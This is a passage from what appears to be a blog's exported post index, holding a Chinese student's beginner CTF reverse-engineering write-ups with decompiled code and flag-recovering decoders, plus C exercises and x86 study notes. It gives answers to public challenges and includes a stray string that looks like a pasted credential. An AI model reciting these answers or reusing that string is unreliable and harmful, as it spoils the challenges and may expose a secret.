global[33]&#x3D;&#123;&#39;f&#39;,0xA,&#39;k&#39;,0xC,&#39;w&#39;,&#39;&amp;&#39;,&#39;O&#39;,&#39;.&#39;,&#39;@&#39;,0x11,&#39;x&#39;,0x0D,&#39;Z&#39;,&#39;;&#39;,&#39;U&#39;,0x11,&#39;p&#39;,0x19,&#39;F&#39;,0x1F,&#39;v&#39;,&#39;&quot;&#39;,&#39;M&#39;,&#39;#&#39;,&#39;D&#39;,0x0E,&#39;g&#39;,6,&#39;h&#39;,0x0F,&#39;G&#39;,&#39;2&#39;,&#39;O&#39;&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for ( i &#x3D; 1; i &lt; 33; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        v6[i] &#x3D;global[i] ^ global[i - 1];</span><br><span class="line">        printf(&quot;%c&quot;,v6[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/xor_4.png"></p><p>第一位f是不运算的，抄上就行了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二周学习与做题记录</title>
      <link href="2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><a id="more"></a><ol><li>学习了while、for、do while循环</li><li>学习了&gt;、&gt;=、!=、==、+=等运算符</li></ol><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write_up"></a>Write_up</h1><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p><a href="https://buuoj.cn/challenges#easyre">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/easyre_1.PNG"></p><p>IDA打开搜索字符串即找到flag</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/easyre_2.PNG"></p><h2 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h2><p><a href="https://buuoj.cn/challenges#reverse1">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_1.PNG"></p><p>IDA打开查看字符串</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_2.PNG"></p><p>由 this is the right flag 转到主要函数</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_4.PNG"></p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse1_3.PNG"></p><p>flag为{hell0_w0rld}</p><h2 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h2><p><a href="https://buuoj.cn/challenges#reverse3">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_1.PNG"></p><p>ida32打开查看main函数</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_2.PNG"></p><p>sub_4110BE经过跳转为下方函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">void *__cdecl sub_411AB0(char *a1, unsigned int a2, int *a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; &#x2F;&#x2F; STE0_4</span><br><span class="line">  int v5; &#x2F;&#x2F; STE0_4</span><br><span class="line">  int v6; &#x2F;&#x2F; STE0_4</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+D4h] [ebp-38h]</span><br><span class="line">  signed int i; &#x2F;&#x2F; [esp+E0h] [ebp-2Ch]</span><br><span class="line">  unsigned int v9; &#x2F;&#x2F; [esp+ECh] [ebp-20h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+ECh] [ebp-20h]</span><br><span class="line">  signed int v11; &#x2F;&#x2F; [esp+ECh] [ebp-20h]</span><br><span class="line">  void *Dst; &#x2F;&#x2F; [esp+F8h] [ebp-14h]</span><br><span class="line">  char *v13; &#x2F;&#x2F; [esp+104h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  if ( !a1 || !a2 )</span><br><span class="line">    return 0;</span><br><span class="line">  v9 &#x3D; a2 &#x2F; 3;</span><br><span class="line">  if ( (signed int)(a2 &#x2F; 3) % 3 )</span><br><span class="line">    ++v9;</span><br><span class="line">  v10 &#x3D; 4 * v9;</span><br><span class="line">  *a3 &#x3D; v10;</span><br><span class="line">  Dst &#x3D; malloc(v10 + 1);</span><br><span class="line">  if ( !Dst )</span><br><span class="line">    return 0;</span><br><span class="line">  j_memset(Dst, 0, v10 + 1);</span><br><span class="line">  v13 &#x3D; a1;</span><br><span class="line">  v11 &#x3D; a2;</span><br><span class="line">  v7 &#x3D; 0;</span><br><span class="line">  while ( v11 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_41A144[2] &#x3D; 0;</span><br><span class="line">    byte_41A144[1] &#x3D; 0;</span><br><span class="line">    byte_41A144[0] &#x3D; 0;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 3 &amp;&amp; v11 &gt;&#x3D; 1; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      byte_41A144[i] &#x3D; *v13;</span><br><span class="line">      --v11;</span><br><span class="line">      ++v13;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !i )</span><br><span class="line">      break;</span><br><span class="line">    switch ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        *((_BYTE *)Dst + v7) &#x3D; aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v4 &#x3D; v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v4++) &#x3D; aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) | </span><br><span class="line">         16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v4++) &#x3D; aAbcdefghijklmn[64];</span><br><span class="line">        *((_BYTE *)Dst + v4) &#x3D; aAbcdefghijklmn[64];</span><br><span class="line">        v7 &#x3D; v4 + 1;</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        *((_BYTE *)Dst + v7) &#x3D; aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v5 &#x3D; v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v5++) &#x3D; aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) |</span><br><span class="line">        16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v5++) &#x3D; aAbcdefghijklmn[((byte_41A144[2] &amp; 0xC0) &gt;&gt; 6) |</span><br><span class="line">        4 * (byte_41A144[1] &amp; 0xF)];</span><br><span class="line">        *((_BYTE *)Dst + v5) &#x3D; aAbcdefghijklmn[64];</span><br><span class="line">        v7 &#x3D; v5 + 1;</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        *((_BYTE *)Dst + v7) &#x3D; aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v6 &#x3D; v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v6++) &#x3D; aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) |</span><br><span class="line">        16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v6++) &#x3D; aAbcdefghijklmn[((byte_41A144[2] &amp; 0xC0) &gt;&gt; 6) |</span><br><span class="line">        4 * (byte_41A144[1] &amp; 0xF)];</span><br><span class="line">        *((_BYTE *)Dst + v6) &#x3D; aAbcdefghijklmn[byte_41A144[2] &amp; 0x3F];</span><br><span class="line">        v7 &#x3D; v6 + 1;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)Dst + v7) &#x3D; 0;</span><br><span class="line">  return Dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_3.PNG"></p><p>应该是将str进行base64加密</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_4.PNG"></p><p>将整个程序还原一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char Dest[100] &#x3D; &#123;0&#125;;</span><br><span class="line">char Str2[] &#x3D; &quot;e3nifIH9b_C@n@dH&quot;;</span><br><span class="line">int i, v8;</span><br><span class="line">v8 &#x3D; strlen(Str2);</span><br><span class="line">for ( i &#x3D; 0; i &lt; v8; i++ )</span><br><span class="line">&#123;</span><br><span class="line">Dest[i] &#x3D; Str2[i] - i;</span><br><span class="line">printf(&quot;%c&quot;, Dest[i]);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为e2lfbDB2ZV95b3V9<br>base64解码为{i_l0ve_you}</p><h2 id="GKCTF2020-Check-1n"><a href="#GKCTF2020-Check-1n" class="headerlink" title="[GKCTF2020]Check_1n"></a>[GKCTF2020]Check_1n</h2><p><a href="https://buuoj.cn/challenges#reverse3">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_1.PNG"></p><p>打开程序提示输入密码，随意输个提示密码错误<br>在ida中搜索’密码错误’</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_2.PNG"></p><p>跳转至指定函数，找到’密码错误’所在位置</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_3.PNG"></p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_4.PNG"></p><p>密码为HelloWorld</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_5.PNG"></p><p>选中flag，base64解码</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_6.PNG"></p><p>根据提示打开’打砖块’, flag自动出现</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_7.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>补充</title>
      <link href="2020/11/29/%E8%A1%A5%E5%85%85/"/>
      <url>2020/11/29/%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="背景正在优化中。"><a href="#背景正在优化中。" class="headerlink" title="背景正在优化中。"></a>背景正在优化中。</h1><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">default_cover: </span><br><span class="line">    - &#x2F;img&#x2F;1.jpg</span><br><span class="line">    - &#x2F;img&#x2F;2.jpg</span><br><span class="line">    - &#x2F;img&#x2F;3.jpg</span><br><span class="line">    - &#x2F;img&#x2F;4.png</span><br><span class="line">    - &#x2F;img&#x2F;5.jpg</span><br><span class="line">    - &#x2F;img&#x2F;6.jpg</span><br><span class="line">    - &#x2F;img&#x2F;7.png</span><br><span class="line">    - &#x2F;img&#x2F;8.png</span><br><span class="line">    - &#x2F;img&#x2F;9.png</span><br><span class="line">    - &#x2F;img&#x2F;10.png</span><br><span class="line">    - &#x2F;img&#x2F;11.png</span><br><span class="line">    - &#x2F;img&#x2F;12.png</span><br><span class="line">    - &#x2F;img&#x2F;13.png</span><br><span class="line">    - &#x2F;img&#x2F;14.png</span><br><span class="line">L1uis112240203</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编程练习1</title>
      <link href="2020/11/29/%E8%8F%9C%E9%B8%A1%E7%9A%84%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
      <url>2020/11/29/%E8%8F%9C%E9%B8%A1%E7%9A%84%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="C语言篇"><a href="#C语言篇" class="headerlink" title="C语言篇"></a>C语言篇</h1><a id="more"></a><h2 id="计算1-2-3-…-n"><a href="#计算1-2-3-…-n" class="headerlink" title="计算1+2+3+…+n"></a>计算1+2+3+…+n</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; &#x2F;&#x2F;计算1+2+3+...+n </span><br><span class="line"> int main(void)</span><br><span class="line"> &#123;</span><br><span class="line">int a, b, c, d;</span><br><span class="line">b &#x3D; 0;</span><br><span class="line">c &#x3D; 0;</span><br><span class="line">printf(&quot;请输入1开始程序\n&quot;);</span><br><span class="line">while(scanf(&quot;%d&quot;, &amp;d) &#x3D;&#x3D; 1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;请输入n（为数字），输出结果为：1+2+3+...+n\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;a);</span><br><span class="line">    while (b &lt;&#x3D; a)</span><br><span class="line">        &#123;</span><br><span class="line">         c &#x3D; b + c;</span><br><span class="line">         b++; </span><br><span class="line">        &#125;</span><br><span class="line">    printf(&quot;1+2+3+...+n &#x3D; %d\n&quot;, c);</span><br><span class="line">    printf(&quot;请输入q离开程序，或者输入1再次开始程序计算令一个1+2+3+...+n\n&quot;);</span><br><span class="line">    b &#x3D; 0;</span><br><span class="line">    c &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="计算n！"><a href="#计算n！" class="headerlink" title="计算n！"></a>计算n！</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; &#x2F;&#x2F;计算n！ (不精确且最大为170)</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int a, b, d;</span><br><span class="line">double c;</span><br><span class="line">b &#x3D; 1;</span><br><span class="line">c &#x3D; 1;</span><br><span class="line">printf(&quot;请输入1开始程序\n&quot;);</span><br><span class="line">while(scanf(&quot;%d&quot;, &amp;d) &#x3D;&#x3D; 1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;请输入n（为数字），输出结果为n！：\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;a);</span><br><span class="line">    while (b &lt;&#x3D; a)</span><br><span class="line">        &#123;</span><br><span class="line">        c &#x3D; b * c;</span><br><span class="line">        b++; </span><br><span class="line">        &#125;</span><br><span class="line">    printf(&quot;n! &#x3D; %e\n&quot;, c);</span><br><span class="line">    printf(&quot;请输入q离开程序，或者输入1再次开始程序计算令一个数的阶乘\n&quot;);</span><br><span class="line">    b &#x3D; 1;</span><br><span class="line">    c &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 编程练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++-编程练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一周学习与做题记录</title>
      <link href="2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><a id="more"></a><h2 id="C语言篇"><a href="#C语言篇" class="headerlink" title="C语言篇"></a>C语言篇</h2><ol><li>学习了——strlen()函数</li><li>学习了关键字——const</li><li>学习了字符串</li><li>如何创建、储存字符串</li><li>如何用strlen()函数获取字符串长度</li><li>用C预处理器指令#define和ANSCI的const修饰创建符号常量</li></ol><h2 id="x86汇编篇"><a href="#x86汇编篇" class="headerlink" title="x86汇编篇"></a>x86汇编篇</h2><h3 id="常用x86汇编指令："><a href="#常用x86汇编指令：" class="headerlink" title="常用x86汇编指令："></a>常用x86汇编指令：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MOV MOV EAX,ECX(将ECX的值存入EAX)</span><br><span class="line">ADD ADD EAX,ECX EAX+&#x3D;ECX(将EAX加上ECX的值)</span><br><span class="line">SUB SUB EAX,ECX EAX-&#x3D;ECX(将EAX减去ECX的值)</span><br><span class="line">INC INC EAX EAX++ (将EAX的值加1)</span><br><span class="line">DEC DEC EAX EAX-- (将EAX的值减1)</span><br><span class="line">LEA LEA EAX,[ECX+4] (将ECX+4的值存入EAX)</span><br><span class="line">CMP CMP EAX ECX if(EAX&#x3D;&#x3D;ECX) ZF&#x3D;1 else ZF&#x3D;0 (将两个值比较并根据结果设置0标志位ZF)</span><br><span class="line">TEST TEST EAX EAX if(eax&#x3D;&#x3D;0) ZF&#x3D;1 else ZF&#x3D;0 (将值与0比较并根据结果设置0标志位ZF)</span><br><span class="line">JE(JZ) JE 04001000 if(ZF&#x3D;&#x3D;1) GOTO 04001000 (若ZF为1，则跳转道04001000)</span><br><span class="line">JNE(JNZ) JNE 04001000 if(ZF&#x3D;&#x3D;0) GOTO 04001000 (若ZF为0，则跳转道04001000)</span><br><span class="line">JMP JMP 04001000 GOTO 04001000 (无条件跳转道04001000)</span><br><span class="line">CALL CALL IstrcmpW (调用IstrcmpW)</span><br><span class="line">PUSH PUSH 00000001 (将00000001入栈)</span><br><span class="line">POP POP EAX (出栈并将获取的值存入EAX)</span><br></pre></td></tr></table></figure><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write_up"></a>Write_up</h1><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5079&page=1">题目链接</a><br>搜索字符串直接获取flag</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/insanity.PNG"></p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5073&page=1">题目链接</a><br>ida打开，观察main函数伪代码</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/re1_1.png"></p><p>然后在16进制试图搜索flag</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/re1_2.png"></p><p>双击转到</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/re1_3.png"></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5074&page=1">题目链接</a><br>ida打开，查看main函数伪代码，在结尾跳转多次，发现</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/game_1.png"></p><p>还有一堆数字，以及一个for循环。</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/game_2.png"></p><p>此for循环运行结果即为flag。</p><p>还原一下程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    int a[56] &#x3D; &#123;18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,</span><br><span class="line">        62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0&#125;;</span><br><span class="line">    int b[56] &#x3D; &#123;123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,</span><br><span class="line">        96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,</span><br><span class="line">        90,85,64,12,43,76,86,13,114,1,117,126,0&#125;;</span><br><span class="line">    int i &#x3D; 1;</span><br><span class="line">    while(i&lt;&#x3D;56)</span><br><span class="line">        &#123;</span><br><span class="line">        a[i] ^&#x3D; b[i];</span><br><span class="line">            a[i] ^&#x3D; 19;</span><br><span class="line">            printf(&quot;%c&quot;, a[i]);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为flag。</p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5075&page=1">题目链接</a><br>查看main函数伪代码：</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/Hello,CTF_1.png"></p><p>‘v13’16进制转字符串。</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/Hello,CTF_2.png"></p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p><a 